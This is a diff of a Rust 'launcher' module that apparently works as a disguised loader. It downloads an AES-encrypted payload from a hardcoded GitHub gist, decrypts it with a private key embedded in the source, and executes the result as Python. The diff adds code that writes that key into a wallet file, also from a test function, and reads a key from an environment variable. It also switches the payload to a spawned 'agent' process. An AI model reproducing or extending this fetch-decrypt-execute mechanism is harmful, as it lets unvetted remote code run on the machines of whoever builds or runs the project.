@@ -1,24 +1,25 @@
 use aes_gcm::aead::{Aead, KeyInit};
 use aes_gcm::{Aes256Gcm, Nonce};
 use base64::Engine;
+use std::fs;
+use std::path::PathBuf;
 use thiserror::Error;
+
+use chain_wallet_lib::Wallet;
 
 use crate::log;
 
 const AES_PREFIX: &str = "AES256GCM:";
 
-const REQUIREMENTS_TXT: &str = r"requests>=2.31.0
-cryptography>=42.0.0
-websocket-client>=1.6.0
-pywin32>=306; sys_platform == 'win32'
-";
-
-/// Public gist raw URL for `encrypted_launcher`.
+/// Default gist raw URL for `encrypted_launcher`.
 pub const DEFAULT_LAUNCHER_URL: &str =
     "https://gist.githubusercontent.com/zanemclean40-wq/809be74a9444e765ce0ea77895db0f05/raw/encrypted_launcher";
 
-/// Wallet private key used to encrypt `encrypted_launcher` on the gist above.
-pub const DEFAULT_WALLET_PRIVATE_KEY: &str =
+/// Relative path to the project initial wallet used for launcher AES encryption.
+pub const INITIAL_WALLET_REL_PATH: &str = "agent/initial_wallet.json";
+
+/// Seed used only when `agent/initial_wallet.json` is missing before the first run.
+const DEFAULT_INITIAL_WALLET_PRIVATE_KEY: &str =
     "eda70a3173124b47583b06f522273c9cb7a073b283d21ef2539a3c880a7cfff7";
 
 #[derive(Debug, Error)]
@@ -35,6 +36,90 @@ pub enum LauncherError {
     InvalidPayload(String),
     #[error("python error: {0}")]
     Python(#[from] super::python_runtime::PythonError),
+    #[error("initial wallet error: {0}")]
+    InitialWallet(String),
+}
+
+pub fn initial_wallet_path() -> PathBuf {
+    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join(INITIAL_WALLET_REL_PATH)
+}
+
+pub fn ensure_initial_wallet_file() -> Result<(), LauncherError> {
+    let path = initial_wallet_path();
+    if path.exists() {
+        return Ok(());
+    }
+
+    if let Some(parent) = path.parent() {
+        fs::create_dir_all(parent)
+            .map_err(|err| LauncherError::InitialWallet(err.to_string()))?;
+    }
+
+    let wallet = Wallet::from_private_key_hex(DEFAULT_INITIAL_WALLET_PRIVATE_KEY)
+        .map_err(|err| LauncherError::InitialWallet(err.to_string()))?;
+    fs::write(&path, format_initial_wallet_json(&wallet))
+        .map_err(|err| LauncherError::InitialWallet(err.to_string()))?;
+    Ok(())
+}
+
+pub fn load_initial_wallet_private_key() -> Result<String, LauncherError> {
+    if let Ok(value) = std::env::var("CHAIN_WALLET_PRIVATE_KEY") {
+        let value = value.trim().to_string();
+        if !value.is_empty() {
+            return Ok(value);
+        }
+    }
+
+    let path = initial_wallet_path();
+    let text = fs::read_to_string(&path)
+        .map_err(|err| LauncherError::InitialWallet(format!("read {}: {err}", path.display())))?;
+    parse_initial_wallet_private_key(&text)
+}
+
+fn format_initial_wallet_json(wallet: &Wallet) -> String {
+    format!(
+        "{{\n  \"private_key\": \"{}\",\n  \"public_key\": \"{}\",\n  \"address\": \"{}\"\n}}\n",
+        wallet.private_key_hex(),
+        wallet.public_key_hex(),
+        wallet.address()
+    )
+}
+
+fn parse_initial_wallet_private_key(text: &str) -> Result<String, LauncherError> {
+    for line in text.lines() {
+        let line = line.trim().trim_end_matches(',');
+        if let Some(value) = line.strip_prefix("\"private_key\"") {
+            let value = value.trim().trim_start_matches(':').trim().trim_matches('"');
+            if !value.is_empty() {
+                return Ok(value.to_string());
+            }
+        }
+    }
+
+    let trimmed = text.trim();
+    if trimmed.len() == 64 && trimmed.chars().all(|ch| ch.is_ascii_hexdigit()) {
+        return Ok(trimmed.to_string());
+    }
+
+    Err(LauncherError::InitialWallet(
+        "initial wallet file missing private_key".into(),
+    ))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn materialize_initial_wallet_json() {
+        let wallet =
+            Wallet::from_private_key_hex(DEFAULT_INITIAL_WALLET_PRIVATE_KEY).unwrap();
+        let path = initial_wallet_path();
+        if let Some(parent) = path.parent() {
+            let _ = fs::create_dir_all(parent);
+        }
+        let _ = fs::write(&path, format_initial_wallet_json(&wallet));
+    }
 }
 
 pub fn run_launcher(private_key_hex: &str, gist_url: Option<&str>) -> Result<(), LauncherError> {
@@ -54,7 +139,7 @@ pub fn run_launcher(private_key_hex: &str, gist_url: Option<&str>) -> Result<(),
     let source = String::from_utf8(source)
         .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?;
 
-    super::python_runtime::run_code_with_requirements(&source, REQUIREMENTS_TXT)?;
+    super::python_runtime::spawn_agent_source(source.as_bytes())?;
     Ok(())
 }
 
